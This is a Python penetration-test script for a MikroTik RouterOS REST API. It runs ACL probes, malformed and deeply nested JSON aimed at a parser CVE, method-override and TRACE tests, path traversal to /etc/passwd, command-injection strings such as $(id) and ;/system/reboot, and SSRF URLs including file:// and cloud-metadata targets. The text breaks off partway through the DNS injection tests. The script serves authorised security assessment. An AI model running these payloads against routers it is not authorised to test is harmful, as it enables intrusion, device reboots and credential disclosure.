#!/usr/bin/env python3
"""
MikroTik RouterOS CHR 7.20.8 — REST API Security Assessment
Phase 3, Script 1
Target: [REDACTED-INTERNAL-IP]

Tests (~300 total):
  1. Endpoint Enumeration & ACL Testing (~60 tests)
  2. JSON Parsing Attacks (~50 tests) — HIGH PRIORITY (CVE-2025-10948)
  3. HTTP Method Abuse (~25 tests)
  4. Query Parameter Injection (~30 tests)
  5. Command Injection (~40 tests)
  6. Error Handling & Info Disclosure (~30 tests)
  7. Rate Limiting & Resource Exhaustion (~15 tests)
  8. Content-Type Handling (~20 tests)
  9. Authentication Bypass Attempts (~30 tests)

Evidence: evidence/rest_api_attacks.json
"""

import json
import os
import re
import socket
import sys
import time
import warnings
import threading
import concurrent.futures
from datetime import datetime

# Suppress SSL and urllib3 warnings
warnings.filterwarnings("ignore")

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

sys.path.insert(0, '/home/[REDACTED]/Desktop/[REDACTED-PATH]/MikroTik/scripts')
from mikrotik_common import (
    EvidenceCollector, rest_get, rest_post, rest_patch,
    pull_router_logs, check_router_alive,
    TARGET, ADMIN_USER, ADMIN_PASS, USERS, log, EVIDENCE_DIR
)

# ── Globals ──────────────────────────────────────────────────────────────────
BASE_URL = f"http://{TARGET}/rest"
CLEANUP_IDS = {
    "scripts": [],
    "schedulers": [],
    "addresses": [],
    "firewall_rules": [],
    "users_created": [],
}

ec = EvidenceCollector("attack_rest_api.py", phase=3)


# ── Helpers ──────────────────────────────────────────────────────────────────

def raw_request(method, path, headers=None, data=None, auth=None,
                timeout=10, allow_redirects=True):
    """Send a raw HTTP request and return (status_code, headers_dict, body_text).
    Returns (0, {}, error_string) on connection failure."""
    url = f"http://{TARGET}/rest{path}" if path.startswith("/") else f"http://{TARGET}{path}"
    try:
        r = requests.request(
            method, url,
            headers=headers or {},
            data=data,
            auth=auth,
            timeout=timeout,
            verify=False,
            allow_redirects=allow_redirects,
        )
        return r.status_code, dict(r.headers), r.text
    except Exception as e:
        return 0, {}, str(e)


def raw_post_bytes(path, body_bytes, headers=None, auth=None, timeout=10):
    """POST raw bytes (not JSON-encoded) to a REST endpoint."""
    url = f"http://{TARGET}/rest{path}"
    try:
        r = requests.post(
            url,
            headers=headers or {},
            data=body_bytes,
            auth=auth or (ADMIN_USER, ADMIN_PASS),
            timeout=timeout,
            verify=False,
        )
        try:
            return r.status_code, r.json()
        except Exception:
            return r.status_code, r.text
    except Exception as e:
        return 0, str(e)


def rest_delete(path, user=None, password=None, timeout=10):
    """DELETE a REST API resource. Returns (status_code, data_or_text)."""
    user = user or ADMIN_USER
    password = password or ADMIN_PASS
    try:
        r = requests.delete(
            f"http://{TARGET}/rest{path}",
            auth=(user, password),
            timeout=timeout, verify=False)
        try:
            return r.status_code, r.json()
        except Exception:
            return r.status_code, r.text
    except Exception as e:
        return 0, str(e)


def rest_put(path, data=None, user=None, password=None, timeout=10):
    """PUT to a REST API endpoint. Returns (status_code, data_or_text)."""
    user = user or ADMIN_USER
    password = password or ADMIN_PASS
    try:
        r = requests.put(
            f"http://{TARGET}/rest{path}",
            auth=(user, password),
            headers={"Content-Type": "application/json"},
            json=data or {},
            timeout=timeout, verify=False)
        try:
            return r.status_code, r.json()
        except Exception:
            return r.status_code, r.text
    except Exception as e:
        return 0, str(e)


def cleanup_created_objects():
    """Remove all objects created during testing."""
    log("Cleaning up created objects...")
    cleaned = 0

    # Delete test scripts
    for sid in CLEANUP_IDS["scripts"]:
        try:
            rest_delete(f"/system/script/{sid}")
            cleaned += 1
        except Exception:
            pass

    # Delete test schedulers
    for sid in CLEANUP_IDS["schedulers"]:
        try:
            rest_delete(f"/system/scheduler/{sid}")
            cleaned += 1
        except Exception:
            pass

    # Delete test IP addresses
    for sid in CLEANUP_IDS["addresses"]:
        try:
            rest_delete(f"/ip/address/{sid}")
            cleaned += 1
        except Exception:
            pass

    # Delete test firewall rules
    for sid in CLEANUP_IDS["firewall_rules"]:
        try:
            rest_delete(f"/ip/firewall/filter/{sid}")
            cleaned += 1
        except Exception:
            pass

    # Delete any test users we created (beyond the pre-existing ones)
    for uid in CLEANUP_IDS["users_created"]:
        try:
            rest_delete(f"/user/{uid}")
            cleaned += 1
        except Exception:
            pass

    log(f"  Cleaned up {cleaned} objects")


# =============================================================================
# Section 1: Endpoint Enumeration & ACL Testing (~60 tests)
# =============================================================================

def test_endpoint_acl():
    """Test access control on 20 key endpoints with all permission levels."""
    log("=" * 60)
    log("Section 1: Endpoint Enumeration & ACL Testing")
    log("=" * 60)

    # 20 key endpoints
    endpoints = [
        "/system/resource", "/system/identity", "/user", "/user/group",
        "/file", "/system/script", "/system/scheduler", "/tool/fetch",
        "/ip/firewall/filter", "/ip/address", "/ip/service", "/log",
        "/certificate", "/interface", "/ip/route", "/snmp",
        "/system/package", "/ip/dns", "/ppp/secret", "/system/logging",
    ]

    # User levels: admin, full, read, write, unauthenticated
    user_configs = [
        ("admin", ADMIN_USER, ADMIN_PASS),
        ("full", "testfull", "FullTest123"),
        ("read", "testread", "ReadTest123"),
        ("write", "testwrite", "WriteTest123"),
        ("unauth", None, None),
    ]

    acl_matrix = {}

    for endpoint in endpoints:
        acl_matrix[endpoint] = {}

        for level_name, user, passwd in user_configs:
            auth = (user, passwd) if user else None

            # GET (read)
            try:
                r = requests.get(
                    f"{BASE_URL}{endpoint}",
                    auth=auth, timeout=8, verify=False)
                get_status = r.status_code
            except Exception as e:
                get_status = f"error:{e}"

            acl_matrix[endpoint][f"{level_name}_GET"] = get_status

            # Only test write operations for a subset to keep test count reasonable
            # and to avoid creating too many objects
            if endpoint in ["/system/identity", "/ip/address", "/system/script",
                            "/ip/firewall/filter", "/user"]:
                # POST (create) — use deliberately invalid data so nothing is actually created
                try:
                    r = requests.post(
                        f"{BASE_URL}{endpoint}/add",
                        auth=auth,
                        headers={"Content-Type": "application/json"},
                        json={"_acl_test": "true"},
                        timeout=8, verify=False)
                    post_status = r.status_code
                except Exception as e:
                    post_status = f"error:{e}"

                acl_matrix[endpoint][f"{level_name}_POST"] = post_status

        # Record as a single test per endpoint
        get_results = {k: v for k, v in acl_matrix[endpoint].items() if "_GET" in k}
        post_results = {k: v for k, v in acl_matrix[endpoint].items() if "_POST" in k}

        # Detect anomalies: unauth access, read user writing, etc.
        anomaly = False
        anomaly_details = []

        unauth_get = acl_matrix[endpoint].get("unauth_GET")
        if unauth_get == 200:
            anomaly = True
            anomaly_details.append("Unauthenticated GET returned 200")

        read_post = acl_matrix[endpoint].get("read_POST")
        if read_post and read_post not in [401, 403, 400, "error"]:
            if isinstance(read_post, int) and read_post < 400:
                anomaly = True
                anomaly_details.append(f"Read user POST returned {read_post}")

        ec.add_test(
            "endpoint_acl", f"ACL: {endpoint}",
            f"Test access control on {endpoint} with all permission levels",
            f"GET: {get_results}, POST: {post_results}",
            {"endpoint": endpoint, "acl_results": acl_matrix[endpoint],
             "anomaly_details": anomaly_details},
            anomaly=anomaly,
        )

        if anomaly and anomaly_details:
            for detail in anomaly_details:
                ec.add_finding(
                    "MEDIUM" if "Unauthenticated" in detail else "LOW",
                    f"ACL bypass on {endpoint}",
                    detail,
                    evidence_refs=[f"acl_{endpoint}"],
                    cwe="CWE-862",
                )

    # Summary test
    total_unauth_ok = sum(
        1 for ep in acl_matrix.values()
        if ep.get("unauth_GET") == 200
    )
    ec.add_test(
        "endpoint_acl", "ACL matrix summary",
        "Summary of endpoint access control across all user levels",
        f"Tested {len(endpoints)} endpoints x 5 user levels. "
        f"Unauthenticated 200s: {total_unauth_ok}",
        {"matrix": acl_matrix, "unauth_accessible_count": total_unauth_ok},
        anomaly=total_unauth_ok > 0,
    )


# =============================================================================
# Section 2: JSON Parsing Attacks (~50 tests) — HIGH PRIORITY
# =============================================================================

def test_json_parsing():
    """JSON parsing edge cases — targets CVE-2025-10948 in parse_json_element."""
    log("=" * 60)
    log("Section 2: JSON Parsing Attacks (HIGH PRIORITY — CVE-2025-10948)")
    log("=" * 60)

    # Target endpoints for JSON injection
    json_endpoints = [
        "/system/identity/set",
        "/ip/address/add",
        "/user/add",
        "/system/script/add",
    ]

    # ── 2a: Deep JSON nesting ────────────────────────────────────────────────
    nesting_depths = [10, 50, 100, 500, 1000]
    for depth in nesting_depths:
        # Build deeply nested JSON: {"a":{"a":{"a":...}}}
        nested = '{"name":"a"' + ',{"name":"a"' * 0  # will build manually
        inner = '"deep_test"'
        for _ in range(depth):
            inner = '{"a":' + inner + '}'
        payload = inner.encode("utf-8")

        for ep in json_endpoints[:2]:  # Test on 2 endpoints
            status, resp = raw_post_bytes(
                ep,
                payload,
                headers={"Content-Type": "application/json"},
            )
            is_anomaly = (status == 0 or status >= 500)
            ec.add_test(
                "json_parsing", f"Deep nesting {depth} levels on {ep}",
                f"Send {depth}-level nested JSON to {ep} — tests parse_json_element recursion",
                f"HTTP {status}, response_len={len(str(resp))}",
                {"depth": depth, "endpoint": ep, "status": status,
                 "response": str(resp)[:500]},
                anomaly=is_anomaly,
            )
            if status == 0:
                # Possible crash — check router
                alive = check_router_alive()
                if not alive.get("alive"):
                    ec.add_finding(
                        "CRITICAL",
                        f"Router unresponsive after {depth}-level nested JSON",
                        f"Sending {depth}-level nested JSON to {ep} caused router to become unresponsive",
                        cwe="CWE-674", cvss=9.8,
                    )
                    time.sleep(10)

    # ── 2b: Very long string values ──────────────────────────────────────────
    string_sizes = [
        ("1KB", 1024),
        ("10KB", 10240),
        ("100KB", 102400),
        ("1MB", 1048576),
    ]
    for label, size in string_sizes:
        long_val = "A" * size
        payload = json.dumps({"name": long_val})

        status, resp = raw_post_bytes(
            "/system/identity/set",
            payload.encode("utf-8"),
            headers={"Content-Type": "application/json"},
        )
        ec.add_test(
            "json_parsing", f"Long string value ({label})",
            f"Send {label} string value in JSON body to /system/identity/set",
            f"HTTP {status}, response_len={len(str(resp))}",
            {"size": size, "status": status, "response": str(resp)[:500]},
            anomaly=(status == 0 or status >= 500),
        )

    # ── 2c: Unicode edge cases ───────────────────────────────────────────────
    unicode_payloads = [
        ("null_byte", '{"name":"test\\u0000inject"}'),
        ("surrogate_pair", '{"name":"test\\uD800\\uDC00end"}'),
        ("overlong_2byte", '{"name":"test\\u00C0\\u00AFend"}'),
        ("rtl_marker", '{"name":"test\\u200Fhidden\\u200Fend"}'),
        ("zero_width_space", '{"name":"test\\u200Bend"}'),
        ("replacement_char", '{"name":"test\\uFFFDend"}'),
        ("bom_in_value", '{"name":"\\uFEFFtest"}'),
        ("null_in_key", '{"te\\u0000st":"value"}'),
        ("high_unicode", '{"name":"test\\uDBFF\\uDFFFend"}'),
        ("mixed_escapes", '{"name":"\\t\\n\\r\\\\\\"\\/"}'),
    ]
    for name, payload_str in unicode_payloads:
        for ep in ["/system/identity/set", "/system/script/add"]:
            status, resp = raw_post_bytes(
                ep,
                payload_str.encode("utf-8"),
                headers={"Content-Type": "application/json"},
            )
            ec.add_test(
                "json_parsing", f"Unicode: {name} on {ep}",
                f"Send JSON with {name} unicode edge case to {ep}",
                f"HTTP {status}",
                {"payload_name": name, "endpoint": ep, "status": status,
                 "response": str(resp)[:500]},
                anomaly=(status == 0 or status >= 500),
            )
            # Track scripts to clean up
            if status in [200, 201] and ep == "/system/script/add":
                if isinstance(resp, dict) and resp.get("ret"):
                    CLEANUP_IDS["scripts"].append(resp["ret"])

    # ── 2d: Type confusion ───────────────────────────────────────────────────
    type_confusion_payloads = [
        ("string_for_number", '{"name":"test","mtu":"not_a_number"}'),
        ("array_for_object", '[{"name":"test"}]'),
        ("null_for_string", '{"name":null}'),
        ("number_for_string", '{"name":12345}'),
        ("bool_for_string", '{"name":true}'),
        ("nested_array", '{"name":["a","b","c"]}'),
        ("object_for_string", '{"name":{"nested":"value"}}'),
    ]
    for name, payload_str in type_confusion_payloads:
        status, resp = raw_post_bytes(
            "/system/identity/set",
            payload_str.encode("utf-8"),
            headers={"Content-Type": "application/json"},
        )
        ec.add_test(
            "json_parsing", f"Type confusion: {name}",
            f"Send JSON with type confusion ({name}) to /system/identity/set",
            f"HTTP {status}",
            {"payload_name": name, "status": status, "response": str(resp)[:500]},
            anomaly=(status == 0 or status >= 500),
        )

    # ── 2e: Truncated / malformed JSON ───────────────────────────────────────
    malformed_payloads = [
        ("no_closing_brace", '{"name":"test"'),
        ("no_closing_quote", '{"name":"test'),
        ("trailing_comma", '{"name":"test",}'),
        ("double_comma", '{"name":"test",,"extra":"val"}'),
        ("no_colon", '{"name" "test"}'),
        ("single_quotes", "{'name':'test'}"),
        ("unquoted_key", '{name:"test"}'),
        ("extra_closing", '{"name":"test"}}'),
        ("empty_body", ''),
        ("just_null", 'null'),
        ("just_true", 'true'),
        ("just_string", '"just a string"'),
        ("just_number", '42'),
    ]
    for name, payload_str in malformed_payloads:
        status, resp = raw_post_bytes(
            "/system/identity/set",
            payload_str.encode("utf-8"),
            headers={"Content-Type": "application/json"},
        )
        ec.add_test(
            "json_parsing", f"Malformed JSON: {name}",
            f"Send malformed JSON ({name}) to /system/identity/set",
            f"HTTP {status}",
            {"payload_name": name, "status": status, "response": str(resp)[:500]},
            anomaly=(status == 0 or status >= 500),
        )

    # ── 2f: Duplicate keys ───────────────────────────────────────────────────
    dup_payloads = [
        ("dup_name", '{"name":"first","name":"second"}'),
        ("dup_with_types", '{"name":"string","name":123}'),
        ("triple_dup", '{"name":"a","name":"b","name":"c"}'),
    ]
    for name, payload_str in dup_payloads:
        status, resp = raw_post_bytes(
            "/system/identity/set",
            payload_str.encode("utf-8"),
            headers={"Content-Type": "application/json"},
        )
        ec.add_test(
            "json_parsing", f"Duplicate keys: {name}",
            f"Send JSON with duplicate keys ({name})",
            f"HTTP {status}",
            {"payload_name": name, "status": status, "response": str(resp)[:500]},
            anomaly=(status == 0 or status >= 500),
        )

    # ── 2g: Special numeric values ───────────────────────────────────────────
    numeric_payloads = [
        ("infinity", '{"name":"test","value":Infinity}'),
        ("neg_infinity", '{"name":"test","value":-Infinity}'),
        ("nan", '{"name":"test","value":NaN}'),
        ("huge_number", '{"name":"test","value":1e308}'),
        ("neg_zero", '{"name":"test","value":-0}'),
        ("very_precise", '{"name":"test","value":1.7976931348623157e+308}'),
        ("tiny_number", '{"name":"test","value":5e-324}'),
        ("int_overflow", '{"name":"test","value":99999999999999999999999999999999}'),
    ]
    for name, payload_str in numeric_payloads:
        status, resp = raw_post_bytes(
            "/system/identity/set",
            payload_str.encode("utf-8"),
            headers={"Content-Type": "application/json"},
        )
        ec.add_test(
            "json_parsing", f"Special numeric: {name}",
            f"Send JSON with special numeric value ({name})",
            f"HTTP {status}",
            {"payload_name": name, "status": status, "response": str(resp)[:500]},
            anomaly=(status == 0 or status >= 500),
        )

    # ── 2h: Empty containers / BOM ───────────────────────────────────────────
    container_payloads = [
        ("empty_object", '{}'),
        ("empty_array", '[]'),
        ("empty_string_val", '{"name":""}'),
        ("bom_prefix", '\ufeff{"name":"test"}'),
    ]
    for name, payload_str in container_payloads:
        raw_bytes = payload_str.encode("utf-8-sig") if name == "bom_prefix" else payload_str.encode("utf-8")
        status, resp = raw_post_bytes(
            "/system/identity/set",
            raw_bytes,
            headers={"Content-Type": "application/json"},
        )
        ec.add_test(
            "json_parsing", f"Container/BOM: {name}",
            f"Send {name} JSON to /system/identity/set",
            f"HTTP {status}",
            {"payload_name": name, "status": status, "response": str(resp)[:500]},
            anomaly=(status == 0 or status >= 500),
        )

    # ── 2i: Backslash escaping edge cases ────────────────────────────────────
    escape_payloads = [
        ("double_backslash", '{"name":"test\\\\end"}'),
        ("backslash_n", '{"name":"test\\nend"}'),
        ("backslash_unicode", '{"name":"test\\u0041end"}'),  # \u0041 = A
        ("invalid_escape", '{"name":"test\\xend"}'),
        ("lone_backslash", '{"name":"test\\"}'),
    ]
    for name, payload_str in escape_payloads:
        status, resp = raw_post_bytes(
            "/system/identity/set",
            payload_str.encode("utf-8"),
            headers={"Content-Type": "application/json"},
        )
        ec.add_test(
            "json_parsing", f"Escape: {name}",
            f"Send JSON with {name} backslash escaping",
            f"HTTP {status}",
            {"payload_name": name, "status": status, "response": str(resp)[:500]},
            anomaly=(status == 0 or status >= 500),
        )


# =============================================================================
# Section 3: HTTP Method Abuse (~25 tests)
# =============================================================================

def test_http_methods():
    """Test unusual HTTP methods and method override techniques."""
    log("=" * 60)
    log("Section 3: HTTP Method Abuse")
    log("=" * 60)

    test_path = "/system/resource"
    auth = (ADMIN_USER, ADMIN_PASS)

    # ── 3a: Unusual HTTP methods ─────────────────────────────────────────────
    unusual_methods = [
        "TRACE", "OPTIONS", "PUT", "DELETE", "CONNECT",
        "PROPFIND", "MKCOL", "COPY", "MOVE", "LOCK", "UNLOCK",
        "PROPPATCH", "SEARCH",
    ]
    for method in unusual_methods:
        status, hdrs, body = raw_request(method, test_path, auth=auth, timeout=8)
        is_anomaly = False
        anomaly_reason = ""

        # TRACE returning the request is XST
        if method == "TRACE" and status == 200 and "TRACE" in body:
            is_anomaly = True
            anomaly_reason = "TRACE method echoes request — XST possible"

        # OPTIONS revealing methods
        if method == "OPTIONS" and status == 200:
            allow = hdrs.get("Allow", "")
            if allow:
                anomaly_reason = f"OPTIONS reveals allowed methods: {allow}"

        ec.add_test(
            "http_methods", f"Method: {method} on {test_path}",
            f"Send {method} request to {test_path}",
            f"HTTP {status}, body_len={len(body)}",
            {"method": method, "status": status, "headers": hdrs,
             "body_preview": body[:500], "anomaly_reason": anomaly_reason},
            anomaly=is_anomaly,
        )

        if is_anomaly and "TRACE" in method:
            ec.add_finding(
                "LOW",
                "TRACE method enabled — Cross-Site Tracing (XST)",
                f"The server responds to TRACE on {test_path} and echoes the request body, "
                "which can be used to steal credentials via XST attacks",
                cwe="CWE-693",
            )

    # ── 3b: Method override headers ──────────────────────────────────────────
    override_tests = [
        ("X-HTTP-Method-Override", "DELETE"),
        ("X-HTTP-Method-Override", "PUT"),
        ("X-Method-Override", "DELETE"),
        ("X-HTTP-Method", "DELETE"),
    ]
    for header_name, override_method in override_tests:
        status, hdrs, body = raw_request(
            "POST", test_path,
            headers={header_name: override_method, "Content-Type": "application/json"},
            data="{}",
            auth=auth,
        )
        # Compare to actual method behavior
        real_status, _, _ = raw_request(override_method, test_path, auth=auth)
        is_anomaly = (status == real_status and status != 404 and status != 405)

        ec.add_test(
            "http_methods", f"Method override: {header_name}={override_method}",
            f"POST with {header_name}: {override_method} header",
            f"HTTP {status} (actual {override_method} returns {real_status})",
            {"header": header_name, "override_to": override_method,
             "overridden_status": status, "real_method_status": real_status,
             "body_preview": body[:300]},
            anomaly=is_anomaly,
        )

    # _method query parameter override
    status, hdrs, body = raw_request(
        "POST", f"{test_path}?_method=DELETE",
        headers={"Content-Type": "application/json"},
        data="{}",
        auth=auth,
    )
    ec.add_test(
        "http_methods", "Query param method override: ?_method=DELETE",
        "POST with ?_method=DELETE query parameter",
        f"HTTP {status}",
        {"status": status, "body_preview": body[:300]},
        anomaly=(status == 200),
    )

    # ── 3c: HEAD vs GET consistency ──────────────────────────────────────────
    get_status, get_hdrs, get_body = raw_request("GET", test_path, auth=auth)
    head_status, head_hdrs, head_body = raw_request("HEAD", test_path, auth=auth)

    # HEAD should return same status and headers but no body
    headers_match = (get_hdrs.get("Content-Type") == head_hdrs.get("Content-Type"))
    ec.add_test(
        "http_methods", "HEAD vs GET consistency",
        "Compare HEAD and GET responses for /system/resource",
        f"GET={get_status} HEAD={head_status}, headers_match={headers_match}, "
        f"HEAD body_len={len(head_body)}",
        {"get_status": get_status, "head_status": head_status,
         "headers_match": headers_match, "head_body_len": len(head_body)},
        anomaly=(get_status != head_status or len(head_body) > 0),
    )

    # ── 3d: TRACE on multiple endpoints for XST ─────────────────────────────
    trace_paths = ["/system/identity", "/user", "/ip/address"]
    for path in trace_paths:
        status, hdrs, body = raw_request("TRACE", path, auth=auth)
        ec.add_test(
            "http_methods", f"TRACE on {path}",
            f"Send TRACE to {path} to test for XST",
            f"HTTP {status}, body contains TRACE: {'TRACE' in body}",
            {"path": path, "status": status, "body_preview": body[:500]},
            anomaly=(status == 200 and "TRACE" in body),
        )


# =============================================================================
# Section 4: Query Parameter Injection (~30 tests)
# =============================================================================

def test_query_injection():
    """Test query parameter injection, RouterOS-specific operators, path traversal."""
    log("=" * 60)
    log("Section 4: Query Parameter Injection")
    log("=" * 60)

    auth = (ADMIN_USER, ADMIN_PASS)

    # ── 4a: RouterOS REST API operators ──────────────────────────────────────
    operator_tests = [
        ("proplist_name", "/user?.proplist=name", "Filter to show only name field"),
        ("proplist_password", "/user?.proplist=name,password",
         "Attempt to extract password via proplist"),
        ("proplist_group", "/user?.proplist=name,group", "Filter to name and group"),
        ("query_admin", "/user?.query=name=admin", "Query filter for admin user"),
        ("query_regex", "/user?.query=name~admin", "Regex query for admin-like users"),
        ("query_lt", "/user?.query=name<z", "Less-than query operator"),
        ("query_gt", "/user?.query=name>a", "Greater-than query operator"),
        ("query_negate", "/user?.query=!name=admin", "Negated query filter"),
        ("method_delete", "/user?_method=DELETE", "Attempt method override via query param"),
        ("proplist_star", "/user?.proplist=*", "Wildcard proplist"),
    ]
    for name, path, desc in operator_tests:
        try:
            r = requests.get(
                f"http://{TARGET}/rest{path}",
                auth=auth, timeout=8, verify=False)
            status = r.status_code
            try:
                resp_data = r.json()
            except Exception:
                resp_data = r.text

            # Check if password-like fields are returned
            is_anomaly = False
            if "password" in name.lower() and status == 200:
                resp_str = str(resp_data).lower()
                if "password" in resp_str and "testpass" in resp_str:
                    is_anomaly = True
                    ec.add_finding(
                        "HIGH",
                        "Password disclosure via .proplist query parameter",
                        f"GET {path} returns password field contents",
                        cwe="CWE-200",
                    )

            ec.add_test(
                "query_injection", f"Operator: {name}",
                desc,
                f"HTTP {status}",
                {"path": path, "status": status, "response": str(resp_data)[:500]},
                anomaly=is_anomaly,
            )
        except Exception as e:
            ec.add_test(
                "query_injection", f"Operator: {name}", desc,
                f"Error: {e}", anomaly=True,
            )

    # ── 4b: Path traversal in endpoint ───────────────────────────────────────
    traversal_paths = [
        "/system/../user",
        "/system/../../etc/passwd",
        "/..%2f..%2fetc/passwd",
        "/system/..%2fuser",
        "/%2e%2e/%2e%2e/etc/passwd",
        "/system/resource/..%00/user",
        "/system/./resource",
        "/system//resource",
        "/system/resource%00",
        "/./system/resource",
    ]
    for path in traversal_paths:
        status, hdrs, body = raw_request("GET", path, auth=auth)
        # Anomaly if we get 200 on a traversal path (except the benign ./resource one)
        is_traversal_success = (status == 200 and ".." in path and "passwd" in path.lower())
        ec.add_test(
            "query_injection", f"Path traversal: {path}",
            f"Test directory traversal via REST path: {path}",
            f"HTTP {status}, body_len={len(body)}",
            {"path": path, "status": status, "body_preview": body[:500]},
            anomaly=is_traversal_success,
        )
        if is_traversal_success:
            ec.add_finding(
                "CRITICAL",
                "Path traversal in REST API",
                f"GET /rest{path} returned 200 — possible directory traversal",
                cwe="CWE-22",
            )

    # ── 4c: Parameter pollution ──────────────────────────────────────────────
    pollution_tests = [
        ("double_proplist", "/user?.proplist=name&.proplist=password"),
        ("double_query", "/user?.query=name=admin&.query=name=testfull"),
        ("conflicting_values", "/system/identity/set?name=hacked1&name=hacked2"),
    ]
    for name, path in pollution_tests:
        try:
            r = requests.get(
                f"http://{TARGET}/rest{path}",
                auth=auth, timeout=8, verify=False)
            ec.add_test(
                "query_injection", f"Param pollution: {name}",
                f"Test HTTP parameter pollution: {path}",
                f"HTTP {r.status_code}",
                {"path": path, "status": r.status_code, "response": r.text[:500]},
                anomaly=False,
            )
        except Exception as e:
            ec.add_test(
                "query_injection", f"Param pollution: {name}",
                f"Test parameter pollution", f"Error: {e}",
            )

    # ── 4d: Long query strings ───────────────────────────────────────────────
    long_sizes = [("1KB", 1024), ("10KB", 10240), ("100KB", 102400)]
    for label, size in long_sizes:
        long_param = "A" * size
        try:
            r = requests.get(
                f"http://{TARGET}/rest/system/resource?x={long_param}",
                auth=auth, timeout=15, verify=False)
            ec.add_test(
                "query_injection", f"Long query string ({label})",
                f"Send GET with {label} query parameter",
                f"HTTP {r.status_code}",
                {"size": size, "status": r.status_code,
                 "response_preview": r.text[:300]},
                anomaly=(r.status_code == 0 or r.status_code >= 500),
            )
        except Exception as e:
            ec.add_test(
                "query_injection", f"Long query string ({label})",
                f"Send GET with {label} query string",
                f"Error: {e}",
                {"size": size, "error": str(e)},
                anomaly=True,
            )


# =============================================================================
# Section 5: Command Injection (~40 tests)
# =============================================================================

def test_command_injection():
    """Test command injection via scripts, schedulers, fetch (SSRF), ping, DNS."""
    log("=" * 60)
    log("Section 5: Command Injection")
    log("=" * 60)

    auth = (ADMIN_USER, ADMIN_PASS)

    # ── 5a: Script body injection ────────────────────────────────────────────
    script_payloads = [
        ("subshell", '$(id)'),
        ("backtick", '`id`'),
        ("semicolon", ';id'),
        ("pipe", '|id'),
        ("newline", 'echo test\nid'),
        ("ampersand", 'echo test && id'),
        ("dollar_brace", '${IFS}id'),
        ("null_byte", 'echo test\x00id'),
        ("comment_inject", 'echo test # comment\nid'),
        ("redirect", 'echo test > /tmp/rce_test'),
    ]
    for name, payload in script_payloads:
        script_name = f"_test_inj_{name}"
        status, resp = rest_post(
            "/system/script/add",
            {"name": script_name, "source": payload},
        )
        ec.add_test(
            "cmd_injection", f"Script injection: {name}",
            f"Add script with source containing '{name}' command injection pattern",
            f"HTTP {status} — {'ACCEPTED' if status in [200, 201] else 'REJECTED'}",
            {"payload_name": name, "payload": payload, "status": status,
             "response": str(resp)[:500]},
            anomaly=False,  # We EXPECT scripts to be created; the question is whether they execute
        )

        # Track for cleanup; also check if it was actually created
        if status in [200, 201] and isinstance(resp, dict):
            sid = resp.get("ret") or resp.get(".id")
            if sid:
                CLEANUP_IDS["scripts"].append(sid)
            else:
                # Try to find by name
                find_status, find_resp = rest_get(f"/system/script?name={script_name}")
                if find_status == 200 and isinstance(find_resp, list) and find_resp:
                    sid = find_resp[0].get(".id")
                    if sid:
                        CLEANUP_IDS["scripts"].append(sid)

    # ── 5b: Scheduler on-event injection ─────────────────────────────────────
    scheduler_payloads = [
        ("subshell_sched", '$(id)'),
        ("backtick_sched", '`id`'),
        ("semicolon_sched", ';/system/reboot'),
        ("pipe_sched", '|/system/reboot'),
        ("newline_sched", '/log info "safe"\n/system/reboot'),
    ]
    for name, payload in scheduler_payloads:
        sched_name = f"_test_sched_{name}"
        status, resp = rest_post(
            "/system/scheduler/add",
            {"name": sched_name, "on-event": payload, "interval": "99d"},
        )
        ec.add_test(
            "cmd_injection", f"Scheduler injection: {name}",
            f"Add scheduler with on-event containing '{name}' injection pattern",
            f"HTTP {status} — {'ACCEPTED' if status in [200, 201] else 'REJECTED'}",
            {"payload_name": name, "payload": payload, "status": status,
             "response": str(resp)[:500]},
            anomaly=False,
        )
        # Track for cleanup
        if status in [200, 201] and isinstance(resp, dict):
            sid = resp.get("ret") or resp.get(".id")
            if sid:
                CLEANUP_IDS["schedulers"].append(sid)
            else:
                find_status, find_resp = rest_get(f"/system/scheduler?name={sched_name}")
                if find_status == 200 and isinstance(find_resp, list) and find_resp:
                    sid = find_resp[0].get(".id")
                    if sid:
                        CLEANUP_IDS["schedulers"].append(sid)

    # ── 5c: SSRF via /tool/fetch ─────────────────────────────────────────────
    ssrf_urls = [
        ("loopback", "http://127.0.0.1/"),
        ("self_ip", f"http://{TARGET}/"),
        ("file_proto", "file:///etc/passwd"),
        ("gopher_proto", "gopher://127.0.0.1:8728/"),
        ("hex_ip", "http://0x7f000001/"),
        ("decimal_ip", "http://2130706433/"),
        ("ipv6_loopback", "http://[::1]/"),
        ("internal_api", f"http://127.0.0.1:8728/"),
        ("metadata_aws", "http://[REDACTED-IP]/latest/meta-data/"),
        ("ftp_proto", f"ftp://{ADMIN_USER}:{ADMIN_PASS}@127.0.0.1/"),
    ]
    for name, url in ssrf_urls:
        # Use mode=http and dst-path to prevent actual file write
        status, resp = rest_post(
            "/tool/fetch",
            {"url": url, "mode": "http", "dst-path": f"/dev/null",
             "as-value": "true"},
        )
        # Check if the request was accepted or rejected
        accepted = status in [200, 201]
        resp_str = str(resp)

        # Detect if actual content was fetched
        ssrf_success = (accepted and "data" in resp_str.lower() and
                        "error" not in resp_str.lower())

        ec.add_test(
            "cmd_injection", f"SSRF: {name}",
            f"Test SSRF via /tool/fetch with URL: {url}",
            f"HTTP {status} — {'ACCEPTED' if accepted else 'REJECTED'}",
            {"ssrf_name": name, "url": url, "status": status,
             "response": resp_str[:500]},
            anomaly=ssrf_success,
        )
        if ssrf_success and "file" in name:
            ec.add_finding(
                "HIGH",
                f"SSRF via /tool/fetch — {name} protocol accepted",
                f"/tool/fetch accepted URL {url} and returned content",
                cwe="CWE-918",
            )

    # ── 5d: Ping address injection ───────────────────────────────────────────
    ping_payloads = [
        ("normal", "127.0.0.1"),
        ("semicolon", "127.0.0.1;id"),
        ("pipe", "127.0.0.1|id"),
        ("backtick", "127.0.0.1`id`"),
        ("newline", "127.0.0.1\nid"),
        ("long_host", "A" * 500),
    ]
    for name, addr in ping_payloads:
        status, resp = rest_post(
            "/tool/ping",
            {"address": addr, "count": "1"},
        )
        ec.add_test(
            "cmd_injection", f"Ping injection: {name}",
            f"Test command injection via /tool/ping address parameter",
            f"HTTP {status}",
            {"payload_name": name, "address": addr, "status": status,
             "response": str(resp)[:500]},
            anomaly=(status in [200, 201] and name != "normal"),
        )

    # ── 5e: DNS server injection ─────────────────────────────────────────────
    # Save current DNS settings first
    orig_status, orig_dns = rest_get("/ip/dns")
    orig_servers = ""
    if orig_status == 200 and isinstance(orig_dns, dict):
        orig_servers = orig_dns.get("servers", "")

    dns_payloads = [
        ("semicolon", "[REDACTED-IP];id"),
        ("pipe", "[REDACTED-IP]|id"),
